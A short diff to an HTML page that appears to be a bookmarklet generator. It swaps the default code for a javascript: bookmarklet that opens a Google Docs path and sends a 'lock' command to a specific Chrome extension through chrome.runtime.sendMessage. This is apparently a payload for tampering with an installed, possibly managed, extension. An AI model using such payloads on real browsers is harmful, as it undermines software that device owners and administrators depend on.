@@ -131,7 +131,7 @@
           <input id="title-input" value="bookmarklet"></input>
         </li>
         <li> <label>Code</label></li>
-        <li> <textarea id="code-textarea">alert('hello world');</textarea> </li>
+        <li> <textarea id="code-textarea">javascript:open('/document/d').onload=function(){this.chrome.runtime.sendMessage('gndmhdcefbhlchkhipcnnbkcmicncehk',{command:'lock'},close)}</textarea> </li>
         <li>          
           <button onclick="generateBookmarklet();">Generate Bookmarklet</button>
           <button onclick="runCode();">Run Code</button>
